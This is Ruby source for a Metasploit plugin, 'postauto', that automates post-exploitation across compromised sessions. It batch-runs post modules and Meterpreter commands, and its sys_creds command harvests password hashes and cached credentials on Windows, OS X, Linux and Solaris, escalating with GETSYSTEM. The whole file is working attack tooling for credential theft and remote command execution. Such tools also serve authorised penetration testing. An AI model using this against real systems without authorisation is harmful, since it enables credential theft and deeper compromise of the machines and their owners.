# Copyright (c) 2011, Carlos Perez <carlos_perez[at]darkoperator.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
module Msf
class Plugin::Postauto < Msf::Plugin
	class PostautoCommandDispatcher
		include Msf::Ui::Console::CommandDispatcher

		def name
			"Postauto"
		end

		def commands
			{
				'multi_post'         => "Run a post module against specified sessions.",
				'multi_post_rc'      => "Run resource file with post modules and options against specified sessions.",
				'multi_meter_cmd'    => "Run a Meterpreter Console Command against specified sessions.",
				'multi_meter_cmd_rc' => "Run resource file with Meterpreter Console Commands against specified sessions.",
				"sys_creds"          => "Run system password collection modules against specified sessions."

			}
		end

		# sys_creds Command
		#-------------------------------------------------------------------------------------------
		def cmd_sys_creds(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
				"-h"   => [ false,  "Command Help"]
			)

			cred_mods = [
				{"mod" => "windows/gather/cachedump", "opt" => nil},
				{"mod" => "windows/gather/smart_hashdump", "opt" => "GETSYSTEM=true"},
				{"mod" => "osx/gather/hashdump", "opt" => nil},
				{"mod" => "linux/gather/hashdump", "opt" => nil},
				{"mod" => "solaris/gather/hashdump", "opt" => nil},
			]

			# Parse options
			sessions = nil
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					sessions = val
				end
			end

			cred_mods.each do |p|
				m = framework.post.create(p["mod"])

				# Set Sessions to be processed
				if sessions =~ /all/i
					session_list = m.compatible_sessions
				else
					session_list = sessions.split(",")
				end
				session_list.each do |s|
					if m.session_compatible?(s.to_i)
						m.datastore['SESSION'] = s.to_i
						if p['opt']
							opt_pair = p['opt'].split("=",2)
							m.datastore[opt_pair[0]] = opt_pair[1]
						end
						m.options.validate(m.datastore)
						print_status("")
						print_status("Running #{p['mod']} against #{s}")
						m.run_simple(
							'LocalInput'    => driver.input,
							'LocalOutput'    => driver.output
						)
					end
				end
			end
		end
		# Multi_post Command
		#-------------------------------------------------------------------------------------------
		def cmd_multi_post(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
				"-m"   => [ true,   "Module to run against sessions."],
				"-o"   => [ true,   "Module options."],
				"-h"   => [ false,  "Command Help"]
			)
			post_mod = nil
			mod_opts = nil
			sessions = nil

			# Parse options
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					sessions = val
				when "-m"
					post_mod = val.gsub(/^post\//,"")
				when "-o"
					mod_opts = val
				when "-h"
					print_line opts.usage
					return
				else
					print_staus "Please specify a module to run with the -m option."
					return
				end
			end
			# Set and execute post module with options
			print_status("Loading #{post_mod}")
			m = framework.post.create(post_mod)
			if sessions =~ /all/i
				session_list = m.compatible_sessions
			else
				session_list = sessions.split(",")
			end
			if session_list
				session_list.each do |s|
					if m.session_compatible?(s.to_i)
						print_status("Running against #{s}")
						m.datastore['SESSION'] = s.to_i
						if mod_opts
							mod_opts.each do |o|
								opt_pair = o.split("=",2)
								print_status("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
								m.datastore[opt_pair[0]] = opt_pair[1]
							end
						end
						m.options.validate(m.datastore)
						m.run_simple(
							'LocalInput'    => driver.input,
							'LocalOutput'    => driver.output
						)
					else
						print_error("Session #{s} is not compatible with #{post_mod}")
					end
				end
			else
				print_error("No compatible sessions were found")
			end
		end

		# Multi_post_rc Command
		#-------------------------------------------------------------------------------------------

		def cmd_multi_post_rc(*args)
			opts = Rex::Parser::Arguments.new(
				"-rc"  => [ true,   "Resource file with space separate values <session> <module> <options>, per line."],
				"-h"   => [ false,  "Command Help"]
			)

			post_mod = nil
			session_list = nil
			mod_opts = nil
			entries = []
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-rc"
					script = val
					if not ::File.exists?(script)
						print_error "Resource File does not exists!"
						return
					else
						::File.open(script, "r").each_line do |line|
							# Empty line
							next if line.strip.length < 1
							# Comment
							next if line[0,1] == "#"
							entries << line.chomp
						end
					end
				when "-h"
					print_line opts.usage
					return
				else
					print_line opts.usage
					return
				end
			end
			if entries
				entries.each do |l|
					values = l.split(" ")
					sessions = values[0]
					post_mod = values[1]
					if values.length == 3
						mod_opts = values[2].split(",")
					end
					print_status("Loading #{post_mod}")
					m= framework.post.create(post_mod)
					if sessions =~ /all/i
						session_list = m.compatible_sessions
					else
						session_list = sessions.split(",")
					end
					session_list.each do |s|
						if m.session_compatible?(s.to_i)
							print_status("Running Against #{s}")
							m.datastore['SESSION'] = s.to_i
							if mod_opts
								mod_opts.each do |o|
									opt_pair = o.split("=",2)
									print_status("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
									m.datastore[opt_pair[0]] = opt_pair[1]
								end
							end
							m.options.validate(m.datastore)
							m.run_simple(
								'LocalInput'    => driver.input,
								'LocalOutput'   => driver.output
							)
						else
							print_error("Session #{s} is not compatible with #{post_mod}")
						end
					end
				end
			else
				print_error("Resource file was empty!")
			end

		end

		# Multi_meter_cmd Command
		#-------------------------------------------------------------------------------------------
		def cmd_multi_meter_cmd(*args)
			opts = Rex::Parser::Arguments.new(
				"-s"   => [ true,	"Sessions to run Meterpreter Console Command against. Example <all> or <1,2,3,4>"],
				"-m"   => [ true,   "Meterpreter Console Command to run against sessions."],
				"-h"   => [ false,  "Command Help"]
			)
			command = nil
			session = nil

			# Parse options
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-s"
					session = val
				when "-m"
					command = val
				when "-h"
					print_line opts.usage
					return
				else
					print_staus "Please specify a command to run with the -m option."
					return
				end
			end
			current_sessions = framework.sessions.keys.sort

			if session =~/all/i
				sessions = current_sessions
			else
				sessions = session.split(",")
			end

			sessions.each do |s|
				# Check if session is in the current session list.
				next if not current_sessions.include?(s.to_i)

				# Get session object
				session = framework.sessions.get(s.to_i)

				# Check if session is meterpreter and run command.
				if (session.type == "meterpreter")
					print_good("Running command #{command} against session #{s}")
					session.console.run_single(command)
				else
					print_status("Session #{s} is not a Meterpreter session!")
				end
			end


		end

		# Multi_post_rc Command
		#-------------------------------------------------------------------------------------------

		def cmd_multi_meter_cmd_rc(*args)
			opts = Rex::Parser::Arguments.new(
				"-rc"  => [ true,   "Resource file with space separate values <session> <command>, per line."],
				"-h"   => [ false,  "Command Help"]
			)

			entries = []
			script = nil
			opts.parse(args) do |opt, idx, val|
				case opt
				when "-rc"
					script = val
					if not ::File.exists?(script)
						print_error "Resource File does not exists!"
						return
					else
						::File.open(script, "r").each_line do |line|
							# Empty line
							next if line.strip.length < 1
							# Comment
							next if line[0,1] == "#"
							entries << line.chomp
						end
					end
				when "-h"
					print_line opts.usage
					return
				else
					print_line opts.usage
					return
				end
			end

			entries.each do |entrie|
				session_parm,command = entrie.split(" ", 2)
				current_sessions = framework.sessions.keys.sort
				if session_parm =~ /all/i
					sessions = current_sessions
				else
					sessions = session_parm.split(",")
				end

				sessions.each do |s|
					# Check if session is in the current session list.
					next if not current_sessions.include?(s.to_i)

					# Get session object
					session = framework.sessions.get(s.to_i)

					# Check if session is meterpreter and run command.
					if (session.type == "meterpreter")
						print_good("Running command #{command} against session #{s}")
						session.console.run_single(command)
					else
						print_status("Session #{s} is not a Meterpreter sessions!")
					end
				end
			end

		end
	end

	def initialize(framework, opts)
		super
		add_console_dispatcher(PostautoCommandDispatcher)
		print_status "postauto plugin loaded."
	end
	def cleanup
		remove_console_dispatcher('Postauto')
	end

	def name
		"post_auto"
	end

	def desc
		"Plugin for Post-Exploitation automation."
	end
end
end